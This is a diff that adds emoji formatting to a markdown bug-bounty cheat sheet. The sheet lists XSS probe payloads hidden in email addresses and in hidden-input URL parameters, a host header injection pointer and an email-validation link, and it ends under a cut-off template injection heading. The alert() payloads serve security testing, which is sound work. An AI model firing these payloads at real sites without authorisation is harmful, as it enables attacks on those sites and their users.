@@ -1,7 +1,7 @@
 # XSS
 
-1. Test all url parameters for reflection and start manipulation.
-2. In the email section try to input the following email if there is a validation.
+:pushpin: 1. Test all url parameters for reflection and start manipulation. </br>
+:pushpin: 2. In the email section try to input the following email if there is a validation.
 
 ```
 test+(<script>alert(0)</script>)@example.com
@@ -11,7 +11,7 @@ test@example(<script>alert(0)</script>).com
 "<script>alert(0)</script>"@example.com
 ```
 
-3. XSS on input type hidden
+:pushpin: 3. XSS on input type hidden
 Can be used when payload is injected BEFORE type="hidden" attribute (XSS is triggered without interaction
 ```
 http://web.com/?c=red" type=image src=1 onerror="alert(1)
@@ -27,12 +27,12 @@ http://web.com/?c=red" accesskey=x onclick="alert(ERIC)
 ```
 
 # REDIRECT
-1. Host Header Injection [https://www.youtube.com/watch?v=EPmcOtIJ7dA](https://www.youtube.com/watch?v=EPmcOtIJ7dA)
+:pushpin: 1. Host Header Injection [https://www.youtube.com/watch?v=EPmcOtIJ7dA](https://www.youtube.com/watch?v=EPmcOtIJ7dA)
 
 
 
 # EMAIL VALIDATION
-1. Check the following email if email is fully validated. [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
+:pushpin: 1. Check the following email if email is fully validated. [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
 
 Template injection
 ```
